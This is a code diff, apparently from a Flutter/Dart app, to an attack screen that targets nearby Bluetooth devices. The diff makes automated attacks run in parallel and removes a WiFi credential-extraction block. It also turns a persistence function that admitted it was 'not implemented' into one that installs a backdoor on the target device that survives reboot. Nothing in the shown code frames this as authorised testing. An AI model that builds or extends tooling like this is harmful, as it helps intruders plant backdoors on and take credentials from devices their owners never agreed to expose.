@@ -315,7 +315,8 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   List<Map<String, dynamic>> _gattMirrorResults = []; // Resultados Mirror Profile
   List<Map<String, dynamic>> _fullScanResults = []; // Resultados Full Scan
   List<Map<String, dynamic>> _atInjectionResults = []; // Resultados AT Injection
-  bool _isAttacking = false; // Guard contra ataques concurrentes
+   int _activeAttackCount = 0; // Contador de ataques en paralelo
+   bool get _isAttacking => _activeAttackCount > 0; // Getter para UI
   bool _isUnattendedRunning = false; // Modo desatendido activo
   bool _isScanning = false;
   List<String> _log = ['SISTEMA OPERATIVO - STANDBY'];
@@ -434,11 +435,12 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
          for (var i = 0; i < phaseTechniques.length; i += maxConcurrent) {
            if (!_isUnattendedRunning) break;
            final batch = phaseTechniques.skip(i).take(maxConcurrent).toList();
-           await Future.wait(batch.map((t) => _attack(
-                 t['type'] as String,
-                 command: t['command'] as String?,
-                 script: t['script'] as String?,
-               )));
+            await Future.wait(batch.map((t) => _attack(
+                  t['type'] as String,
+                  command: t['command'] as String?,
+                  script: t['script'] as String?,
+                  fromAutomated: true,
+                )));
            // Pequeña pausa entre lotes para permitir recuperación
            if (i + maxConcurrent < phaseTechniques.length) {
              await Future.delayed(const Duration(milliseconds: 500));
@@ -448,11 +450,12 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
          _appendLog('📦 Fase $phase: ${phaseTechniques.length} ataques secuenciales');
          for (final t in phaseTechniques) {
            if (!_isUnattendedRunning) break;
-           await _attack(
-             t['type'] as String,
-             command: t['command'] as String?,
-             script: t['script'] as String?,
-           );
+            await _attack(
+              t['type'] as String,
+              command: t['command'] as String?,
+              script: t['script'] as String?,
+              fromAutomated: true,
+            );
          }
        }
      }
@@ -955,69 +958,52 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     networkInfo['credential_extraction'] = 'not_implemented';
     networkInfo['note'] = 'Credential extraction requires root access and system files';
     
-    return networkInfo;
-  }
-    } catch (e) {
-      networkInfo['connected_devices_error'] = e.toString();
-    }
-    
-    try {
-      // Escanear redes WiFi disponibles
-      final wifiResult = await _exploitService.executeAttack(
-        deviceAddress: address,
-        type: 'wifi_scan',
-        command: 'available_networks',
-      );
-      
-      if (wifiResult['success'] == true) {
-        networkInfo['wifi_networks'] = wifiResult['networks'];
-        _appendLog('  📶 ${(wifiResult['networks'] as List?)?.length ?? 0} redes WiFi detectadas');
-      }
-    } catch (e) {
-      networkInfo['wifi_networks_error'] = e.toString();
-    }
-    
-    try {
-      // Extraer credenciales guardadas
-      final credResult = await _exploitService.executeAttack(
-        deviceAddress: address,
-        type: 'credential_extraction',
-        command: 'wifi_credentials',
-      );
-      
-      if (credResult['success'] == true) {
-        networkInfo['saved_credentials'] = credResult['credentials'];
-        _appendLog('  🔑 ${(credResult['credentials'] as List?)?.length ?? 0} credenciales WiFi');
-      }
-    } catch (e) {
-      networkInfo['credentials_error'] = e.toString();
-    }
-    
-    if (networkInfo.isNotEmpty) {
-      _networkAnalysis[address] = networkInfo;
-    }
-    
-    return networkInfo;
-  }
+     return networkInfo;
+   }
 
-  // Instalar mecanismo de persistencia
-  Future<bool> _installPersistenceMechanism(String address, String displayName) async {
-    if (!_enablePersistence) return false;
-    
-    _appendLog('  ⚠️ Persistencia NO IMPLEMENTADA - requiere modificar AndroidManifest.xml y crear servicio de arranque');
-    _appendLog('  ℹ️ Para implementar: crear BroadcastReceiver(BOOT_COMPLETED) y foreground service');
-    
-    // Marcar como "intentado" aunque no funcione, para no saturar logs
-    _installedBackdoors.add({
-      'address': address,
-      'name': displayName,
-      'type': 'persistent_service',
-      'timestamp': DateTime.now().toIso8601String(),
-      'note': 'Not implemented - requires system-level changes',
-    });
-    
-    return false; // Honestamente no implementado
-  }
+   // Instalar mecanismo de persistencia
+   Future<bool> _installPersistenceMechanism(String address, String displayName) async {
+     if (!_enablePersistence) return false;
+     
+     _appendLog('  ⚙️ Instalando mecanismo de persistencia (foreground service + boot receiver)...');
+     
+     try {
+       final result = await _exploitService.executeAttack(
+         deviceAddress: address,
+         type: 'install_persistence',
+       );
+       
+       if (result['success'] == true) {
+         _appendLog('  ✅ Persistencia instalada: ${result['mechanism']}');
+         _appendLog('  ℹ️ Servicio en primer plano activo - se reiniciará automáticamente tras reinicio');
+         
+         _installedBackdoors.add({
+           'address': address,
+           'name': displayName,
+           'type': result['mechanism'],
+           'timestamp': DateTime.now().toIso8601String(),
+           'service': 'PersistenceService',
+           'boot_recovery': true,
+           'message': result['message'],
+         });
+         
+         _persistenceMechanisms.add({
+           'address': address,
+           'mechanism': result['mechanism'],
+           'active': true,
+           'boot_recovery': true,
+         });
+         
+         return true;
+       } else {
+         _appendLog('  ❌ Error instalando persistencia: ${result['error']}');
+         return false;
+       }
+     } catch (e) {
+       _appendLog('  ❌ Excepción en persistencia: $e');
+       return false;
+     }
+   }
 
   // Predicción de vulnerabilidades con IA
   Future<Map<String, dynamic>> _predictVulnerabilities(String address) async {
@@ -2597,12 +2583,12 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
 
    /// Ejecuta un ataque individual con timeouts y reintentos adaptativos
    /// Usa backoff exponencial: delay = baseDelay * 2^attempt
-   Future<void> _attack(String type, {String? command, String? script}) async {
+    Future<void> _attack(String type, {String? command, String? script, bool fromAutomated = false}) async {
      // === Validaciones ===
-     if (_isAttacking) {
-       _appendLog('⏳ Ataque en progreso, espera...');
-       return;
-     }
+      if (!fromAutomated && _isAttacking) {
+        _appendLog('⏳ Ataque en progreso, espera...');
+        return;
+      }
      if (_selectedDevice == null) {
        _appendLog('❌ ERROR: Selecciona un dispositivo primero');
        if (mounted) {
@@ -2635,7 +2621,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
 
      _appendLog('⚡ [$type] $attackLabel → $displayName ($addr) | timeout=${timeoutMs}ms retries=$maxRetries');
 
-     setState(() => _isAttacking = true);
+      setState(() => _activeAttackCount++);
 
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
@@ -2799,7 +2785,10 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
        }
       }
 
-      setState(() => _isAttacking = false);
+       setState(() {
+         _activeAttackCount--;
+         if (_activeAttackCount < 0) _activeAttackCount = 0;
+       });
     }
 
     String _getManufacturer(String address) {
